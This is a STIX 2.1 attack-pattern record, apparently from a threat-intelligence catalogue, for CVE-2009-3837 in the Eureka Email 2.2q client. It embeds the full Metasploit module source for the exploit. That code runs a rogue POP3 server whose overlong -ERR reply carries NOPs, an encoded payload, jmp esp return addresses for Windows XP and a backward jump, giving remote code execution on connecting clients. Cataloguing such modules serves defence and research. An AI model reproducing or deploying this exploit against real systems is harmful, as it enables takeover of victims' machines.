{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--df237ca2-ef8f-42aa-8ee2-40fd91a5f1c7",
    "created": "2024-08-14T16:46:22.550923Z",
    "modified": "2024-08-14T16:46:22.550927Z",
    "name": "Eureka Email 2.2q ERR Remote Buffer Overflow",
    "description": " This module exploits a buffer overflow in the Eureka Email 2.2q client that is triggered through an excessively long ERR message.  NOTE: this exploit isn't very reliable. Unfortunately reaching the vulnerable code can only be done when manually checking mail (Ctrl-M). Checking at startup will not reach the code targeted here. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/eureka_mail_err.rb",
            "external_id": "eureka_mail_err.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3837"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Eureka Email 2.2q ERR Remote Buffer Overflow',\n      # bof occurs due to wsprintfA @ 0x43bdf2 in \"Eureka Mail.exe\" v2.2.0.1\n      # overflows a buffer of 512 bytes, smashes a buffer of 256 bytes, then the return address\n      'Description'    => %q{\n        This module exploits a buffer overflow in the Eureka Email 2.2q\n        client that is triggered through an excessively long ERR message.\n\n        NOTE: this exploit isn't very reliable. Unfortunately reaching the\n        vulnerable code can only be done when manually checking mail (Ctrl-M).\n        Checking at startup will not reach the code targeted here.\n      },\n      'Author' \t =>\n        [\n          'Francis Provencher (Protek Research Labs)',\n          'Dr_IDE',\n          'dookie',\n          'jduck'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-3837' ],\n          [ 'OSVDB', '59262' ],\n          [ 'EDB', '10235' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 700,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n          'DisableNops' => true,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Win XP SP3 English',\t{ 'Ret' => 0x7E429353 } ], # jmp esp / user32.dll\n          [ 'Win XP SP2 English', { 'Ret' => 0x77D8AF0A } ], # jmp esp / user32.dll\n        ],\n      'Privileged'     => false,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-10-22'\n      ))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The POP3 daemon port to listen on\", 110 ]),\n      ])\n  end\n\n  def on_client_connect(client)\n    return unless regenerate_payload(client)\n\n    # the offset to eip depends on the local ip address string length...\n    already = \"Your POP3 server had a problem.\\n\"\n    already << datastore['LHOST']\n    already << \" said:\\n\\n    -ERR \"\n    space = (512+256+4) - already.length\n\n    buffer =  \"-ERR \"\n    buffer << make_nops(space - payload.encoded.length)\n    buffer << payload.encoded\n    buffer << [target.ret].pack('V')\n    buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-0x2c0\").encode_string\n    buffer << \"\\r\\n\"\n\n    print_status(\"Sending exploit to #{client.peerhost}:#{client.peerport}...\")\n    client.put(buffer)\n\n    handler\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-22",
    "x_mitre_platforms": [
        "win'"
    ]
}